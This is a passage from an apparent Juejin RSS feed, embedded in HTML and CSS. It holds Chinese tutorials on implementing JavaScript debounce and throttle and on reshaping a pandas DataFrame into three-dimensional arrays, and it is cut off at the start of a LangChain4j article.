blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在前端开发中，高频事件（如输入、滚动、窗口缩放）若不加控制，极易引发性能问题。为应对这一挑战，<strong>防抖（debounce）</strong> 与 <strong>节流（throttle）</strong> 成为必备工具。</p>
<hr/>
<h3 data-id="heading-0">一、防抖：每次触发都重置定时器</h3>
<p>假设我们要实现一个功能：用户在输入框打字时，只有当他停止输入超过 1 秒，才发送请求。</p>
<h4 data-id="heading-1">第一步：我需要延迟执行</h4>
<p>显然，要用 <code>setTimeout</code>：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">setTimeout</span>(() =&gt; {
    <span class="hljs-built_in">ajax</span>(value);
}, <span class="hljs-number">1000</span>);
</code></pre>
<h4 data-id="heading-2">第二步：但如果用户继续输入，之前的请求就不该发</h4>
<p>→ 所以必须<strong>取消之前的定时器</strong>，再建一个新的。</p>
<p>这就要求我们<strong>保存定时器 ID</strong>：</p>
<pre><code class="hljs language-scss" lang="scss">let timerId;
<span class="hljs-comment">// 每次触发时：</span>
if (timerId) <span class="hljs-built_in">clearTimeout</span>(timerId);
timerId = <span class="hljs-built_in">setTimeout</span>(() =&gt; {
    <span class="hljs-built_in">ajax</span>(value);
}, <span class="hljs-number">1000</span>);
</code></pre>
<h4 data-id="heading-3">第三步：处理 <code>this</code> 和参数</h4>
<p>因为 <code>ajax</code> 可能依赖上下文或多个参数，不能直接写死。我们需要在触发时捕获当前的 <code>this</code> 和 <code>arguments</code>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">debounce</span>(<span class="hljs-params">fn, delay</span>) {
    <span class="hljs-keyword">let</span> timerId;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">...args</span>) {
        <span class="hljs-keyword">const</span> context = <span class="hljs-variable language_">this</span>;
        <span class="hljs-keyword">if</span> (timerId) <span class="hljs-built_in">clearTimeout</span>(timerId);
        timerId = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
            fn.<span class="hljs-title function_">apply</span>(context, args);
        }, delay);
    };
}
</code></pre>
<blockquote>
<p>到此，防抖完成。它的全部逻辑就源于一句话： <strong>“每次触发，先删旧定时器，再建新定时器。”</strong><br/>
所谓“停手后执行”，只是这种操作的自然结果。</p>
</blockquote>
<hr/>
<h3 data-id="heading-4">二、节流：控制执行频率，必要时预约补发</h3>
<p>现在需求变了：不管用户多快输入，每 1 秒最多只发一次请求，且<strong>最后一次输入不能丢</strong>。</p>
<h4 data-id="heading-5">第一步：我能立即执行吗？</h4>
<p>用时间戳判断是否已过 <code>delay</code>：</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">now</span> = Date.now()<span class="hljs-comment">;</span>
if (now - last &gt;= delay) {
    fn()<span class="hljs-comment">; </span>
    <span class="hljs-attr">last</span> = now<span class="hljs-comment">; // 记录执行时间</span>
}
</code></pre>
<p>这能保证最小间隔，但有个致命缺陷：如果用户快速输入后立刻停止，最后一次可能永远不会执行。</p>
<h4 data-id="heading-6">第二步：如何不丢尾？</h4>
<p>→ 在冷却期内，<strong>预约一次未来的执行</strong>。这就要用到 <code>setTimeout</code>。</p>
<p>于是逻辑分裂为两条路径：</p>
<ul>
<li><strong>路径 A（可立即执行）</strong> ：时间到了，马上执行，更新 <code>last</code></li>
<li><strong>路径 B（还在冷却）</strong> ：清除之前的预约，重新预约一次执行</li>
</ul>
<h4 data-id="heading-7">第三步：管理预约定时器</h4>
<p>我们需要一个变量 <code>deferTimer</code> 来保存预约任务的 ID：</p>
<pre><code class="hljs language-ini" lang="ini">let <span class="hljs-attr">last</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
let <span class="hljs-attr">deferTimer</span> = null<span class="hljs-comment">;</span>
</code></pre>
<p>当处于冷却期时：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">clearTimeout</span>(deferTimer); <span class="hljs-comment">// 清除旧预约</span>
deferTimer = <span class="hljs-built_in">setTimeout</span>(() =&gt; {
    last = Date<span class="hljs-selector-class">.now</span>(); <span class="hljs-comment">// 关键：这次执行也要记录时间！</span>
    fn<span class="hljs-selector-class">.apply</span>(this, args);
}, delay - (now - last)); <span class="hljs-comment">// 精确计算剩余等待时间</span>
</code></pre>
<h4 data-id="heading-8">第四步：整合逻辑</h4>
<pre><code class="hljs language-ini" lang="ini">function throttle(fn, delay) {
    let <span class="hljs-attr">last</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
    let <span class="hljs-attr">deferTimer</span> = null<span class="hljs-comment">;</span>

    return function(...args) {
        const <span class="hljs-attr">context</span> = this<span class="hljs-comment">;</span>
        const <span class="hljs-attr">now</span> = Date.now()<span class="hljs-comment">;</span>

        if (now - last &gt;= delay) {
            // 路径 A：立即执行
           
            <span class="hljs-attr">last</span> = now<span class="hljs-comment">;</span>
            fn.apply(context, args)<span class="hljs-comment">;</span>
        } else {
            // 路径 B：预约执行
            if (deferTimer) clearTimeout(deferTimer)<span class="hljs-comment">;</span>
            <span class="hljs-attr">deferTimer</span> = setTimeout(() =&gt; {
                <span class="hljs-attr">last</span> = Date.now()<span class="hljs-comment">; // 必须更新！</span>
               
                fn.apply(context, args)<span class="hljs-comment">;</span>
            }, delay - (now - last))<span class="hljs-comment">;</span>
        }
    }<span class="hljs-comment">;</span>
}
</code></pre>
<blockquote>
<p>节流的核心，是<strong>两种执行方式的协同</strong>：</p>
<ul>
<li>立即执行靠时间戳判断</li>
<li>补发执行靠 <code>setTimeout</code> 预约<br/>
而两者共享同一个 <code>last</code> 状态，确保整体节奏不乱。</li>
</ul>
</blockquote>
<hr/>
<h3 data-id="heading-9">三、对比总结：防抖 vs 节流的机制差异</h3>






























<table><thead><tr><th>维度</th><th>防抖（Debounce）</th><th>节流（Throttle）</th></tr></thead><tbody><tr><td>核心操作</td><td>每次触发都 <code>clearTimeout + setTimeout</code></td><td>冷却期内 <code>clearTimeout + setTimeout</code>，否则立即执行</td></tr><tr><td>状态变量</td><td>仅需 <code>timerId</code></td><td>需 <code>last</code>（时间） + <code>deferTimer</code>（预约ID）</td></tr><tr><td>执行特点</td><td>只执行最后一次</td><td>固定间隔执行，且不丢尾</td></tr><tr><td>适用场景</td><td>搜索建议、表单校验</td><td>滚动加载、按钮限频、实时位置上报</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[[python]dataframe二维数据 -- > 三维数据]]></title>    <link>https://juejin.cn/post/7589940210831458347</link>    <guid>https://juejin.cn/post/7589940210831458347</guid>    <pubDate>2026-01-02T07:29:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589940210831458347" data-draft-id="7589940210831441963" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="[python]dataframe二维数据 -- &gt; 三维数据"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-02T07:29:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="import_random"/> <meta itemprop="url" content="https://juejin.cn/user/2013961033882312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            [python]dataframe二维数据 -- &gt; 三维数据
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2013961033882312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    import_random
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:29:43.000Z" title="Fri Jan 02 2026 07:29:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>我们可以将二维DataFrame重塑为三维数组，但需要注意DataFrame是二维的，所以我们需要指定如何将其分成多个二维切片（即第三维）。</p>
<p>假设我们有一个二维DataFrame，形状为 (n_rows, n_columns)，我们想将其重塑为 (a, b, c)，其中 a* b * c = n_rows * n_columsn
但是，由于DataFrame是二维的，我们通常需要先将其转换为NumPy数组，然后进行重塑。</p>
<p>然而，重塑为三维通常意味着我们要增加一个维度。<code>常见的方法是将行或列分组，形成多个二维平面</code>。</p>
<p>例如，假设我们有一个12行4列的DataFrame，我们可以将其重塑为（3, 4, 4）表示有3个4x4的矩阵，或者（4, 3, 4）等。</p>
<p>但是，需要注意的是，重塑后的总元素数量必须与原DataFrame相同。</p>
<p>步骤：</p>
<ol>
<li>将DataFrame转换为NumPy数组。</li>
<li>使用reshape函数重塑数组。</li>
</ol>
<p>另外，我们也可以使用<code>np.reshape</code>或者DataFrame的<code>values.reshape</code>。</p>
<p>但是，如果我们想要按照特定的方式重塑，比如将每几行作为一个二维切片，那么我们需要先确定第三维的大小。</p>
<p>例如，如果我们想要将每m行作为一个二维切片，那么第三维的大小就是 n_rows / m，每个切片是 m x n_columns。</p>
<p>假设原DataFrame有n_rows行，n_columns列，我们想重塑为 (k, m, n_columns)，其中 k * m = n_rows。</p>
<p>下面是一个示例：</p>
<p>将二维DataFrame转换为三维数组（或张量）通常需要根据数据的内在结构进行重塑。以下是几种常见的方法：</p>
<h2 data-id="heading-0">1. <strong>使用NumPy的reshape方法</strong></h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np

<span class="hljs-comment"># 创建示例DataFrame</span>
df = pd.DataFrame({
    <span class="hljs-string">'A'</span>: <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>),
    <span class="hljs-string">'B'</span>: <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>, <span class="hljs-number">24</span>),
    <span class="hljs-string">'C'</span>: <span class="hljs-built_in">range</span>(<span class="hljs-number">24</span>, <span class="hljs-number">36</span>)
})

<span class="hljs-comment"># 转换为三维数组 (3, 4, 3) - 3个时间步长，4个样本，3个特征</span>
array_3d = df.values.reshape(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>)
<span class="hljs-built_in">print</span>(array_3d.shape)  <span class="hljs-comment"># (3, 4, 3)</span>
</code></pre>
<h2 data-id="heading-1">2. <strong>基于时间序列的重塑（时间步长×样本×特征）</strong></h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 假设每4行代表一个时间序列段</span>
n_timesteps = <span class="hljs-number">3</span>
n_samples = <span class="hljs-number">4</span>
n_features = <span class="hljs-number">3</span>

<span class="hljs-comment"># 确保DataFrame行数匹配</span>
<span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(df) == n_timesteps * n_samples

<span class="hljs-comment"># 重塑为 (时间步长, 样本数, 特征数)</span>
reshaped = df.values.reshape(n_timesteps, n_samples, n_features)
</code></pre>
<h2 data-id="heading-2">3. <strong>基于分组变量重塑</strong></h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 创建包含分组列的DataFrame</span>
df_grouped = pd.DataFrame({
    <span class="hljs-string">'group'</span>: [<span class="hljs-string">'A'</span>, <span class="hljs-string">'A'</span>, <span class="hljs-string">'A'</span>, <span class="hljs-string">'B'</span>, <span class="hljs-string">'B'</span>, <span class="hljs-string">'B'</span>, <span class="hljs-string">'C'</span>, <span class="hljs-string">'C'</span>, <span class="hljs-string">'C'</span>],
    <span class="hljs-string">'feature1'</span>: <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>),
    <span class="hljs-string">'feature2'</span>: <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>, <span class="hljs-number">19</span>)
})

<span class="hljs-comment"># 按照分组转换为三维</span>
groups = df_grouped[<span class="hljs-string">'group'</span>].unique()
n_groups = <span class="hljs-built_in">len</span>(groups)
n_rows_per_group = <span class="hljs-number">3</span>
n_features = <span class="hljs-number">2</span>

array_3d = np.zeros((n_groups, n_rows_per_group, n_features))

<span class="hljs-keyword">for</span> i, group <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(groups):
    group_data = df_grouped[df_grouped[<span class="hljs-string">'group'</span>] == group][[<span class="hljs-string">'feature1'</span>, <span class="hljs-string">'feature2'</span>]].values
    array_3d[i] = group_data
</code></pre>
<h2 data-id="heading-3">4. <strong>使用Pandas的MultiIndex创建三维结构</strong></h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 创建多层索引DataFrame</span>
index = pd.MultiIndex.from_product([
    [<span class="hljs-string">'Group1'</span>, <span class="hljs-string">'Group2'</span>],  <span class="hljs-comment"># 第一层</span>
    [<span class="hljs-string">'Time1'</span>, <span class="hljs-string">'Time2'</span>, <span class="hljs-string">'Time3'</span>],  <span class="hljs-comment"># 第二层</span>
    [<span class="hljs-string">'Feature1'</span>, <span class="hljs-string">'Feature2'</span>]  <span class="hljs-comment"># 第三层</span>
], names=[<span class="hljs-string">'Group'</span>, <span class="hljs-string">'Time'</span>, <span class="hljs-string">'Feature'</span>])

df_multi = pd.DataFrame({<span class="hljs-string">'Value'</span>: np.random.randn(<span class="hljs-number">12</span>)}, index=index)

<span class="hljs-comment"># 转换为三维数组</span>
unstacked = df_multi.unstack(level=[<span class="hljs-string">'Group'</span>, <span class="hljs-string">'Time'</span>])
array_3d = unstacked.values.reshape(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>)
</code></pre>
<h2 data-id="heading-4">5. <strong>批量处理的时间序列（深度学习中常用）</strong></h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_sequences</span>(<span class="hljs-params">data, seq_length</span>):
    <span class="hljs-string">"""将时间序列数据转换为监督学习格式"""</span>
    sequences = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data) - seq_length + <span class="hljs-number">1</span>):
        seq = data.iloc[i:i + seq_length].values
        sequences.append(seq)
    <span class="hljs-keyword">return</span> np.array(sequences)

<span class="hljs-comment"># 创建序列数据</span>
sequence_length = <span class="hljs-number">3</span>
X_3d = create_sequences(df, sequence_length)
<span class="hljs-built_in">print</span>(X_3d.shape)  <span class="hljs-comment"># (10, 3, 3) - 10个序列，每个3个时间步，每个时间步3个特征</span>
</code></pre>
<h2 data-id="heading-5">6. <strong>使用TensorFlow/PyTorch进行重塑</strong></h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># TensorFlow</span>
<span class="hljs-keyword">import</span> tensorflow <span class="hljs-keyword">as</span> tf
tensor_3d = tf.reshape(tf.constant(df.values), (<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>))

<span class="hljs-comment"># PyTorch</span>
<span class="hljs-keyword">import</span> torch
tensor_3d = torch.tensor(df.values).reshape(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>)
</code></pre>
<h2 data-id="heading-6">选择重塑维度的指导原则：</h2>
<ol>
<li><strong>时间序列数据</strong>：<code>(时间步长, 样本数, 特征数)</code></li>
<li><strong>图像数据</strong>：<code>(样本数, 高度, 宽度, 通道数)</code></li>
<li><strong>分组数据</strong>：<code>(组数, 组内样本数, 特征数)</code></li>
<li><strong>自然语言处理</strong>：<code>(批大小, 序列长度, 词向量维度)</code></li>
</ol>
<h2 data-id="heading-7">注意事项：</h2>
<ul>
<li>确保重塑后的总元素数量与原始DataFrame一致</li>
<li>考虑数据的实际含义和后续处理需求</li>
<li>如果是面板数据，考虑使用<code>xarray</code>库的<code>DataArray</code>来替代</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> xarray <span class="hljs-keyword">as</span> xr
<span class="hljs-comment"># 创建三维DataArray</span>
da = xr.DataArray(
    df.values.reshape(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>),
    dims=[<span class="hljs-string">'time'</span>, <span class="hljs-string">'sample'</span>, <span class="hljs-string">'feature'</span>],
    coords={
        <span class="hljs-string">'time'</span>: pd.date_range(<span class="hljs-string">'2023-01-01'</span>, periods=<span class="hljs-number">3</span>, freq=<span class="hljs-string">'D'</span>),
        <span class="hljs-string">'sample'</span>: <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>),
        <span class="hljs-string">'feature'</span>: [<span class="hljs-string">'A'</span>, <span class="hljs-string">'B'</span>, <span class="hljs-string">'C'</span>]
    }
)
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LangChain4j 工具调用实战]]></title>    <link>https://juejin.cn/post/7589932422654181412</link>    <guid>https://juejin.cn/post/7589932422654181412</guid>    <pubDate>2026-01-02T07:35:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589932422654181412" data-draft-id="7589940210831474731" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LangChain4j 工具调用实战"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-02T07:35:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员NEO"/> <meta itemprop="url" content="https://juejin.cn/user/1990557030679672"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LangChain4j 工具调用实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1990557030679672/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员NEO
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:35:08.000Z" title="Fri Jan 02 2026 07:35:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body 